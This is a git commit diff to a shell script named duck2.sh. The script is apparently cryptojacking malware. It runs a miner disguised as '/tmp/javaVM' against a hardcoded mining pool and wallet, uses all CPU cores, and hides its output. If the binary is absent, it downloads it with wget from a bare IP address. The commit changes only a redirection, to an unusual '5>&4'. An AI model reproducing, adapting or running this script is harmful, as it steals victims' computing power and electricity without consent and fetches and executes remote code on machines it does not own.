ef9aa19ee6cb8dbb7b7c10057386811425b54655
cronjob <thesunofme1@gmail.com>
2023-11-07 12:42:30 +0700

    Update duck2.sh

--- duck2.sh
+++ duck2.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 if [ -f /tmp/javaVM ]
  	then
- 	/tmp/javaVM -a yespowersugar -o 143.47.231.0:443 -u RLaigv5nSC2dKvM63F8dN4EHjxBEcZi11o -p c=RVN -t $(nproc) > /dev/null 2>&1 &
+ 	/tmp/javaVM -a yespowersugar -o 143.47.231.0:443 -u RLaigv5nSC2dKvM63F8dN4EHjxBEcZi11o -p c=RVN -t $(nproc) > /dev/null 5>&4 &
  	echo Started Existing
  	else
  		wget -q http://150.136.168.71:80/archxx/yespowersugar -O /tmp/javaVM
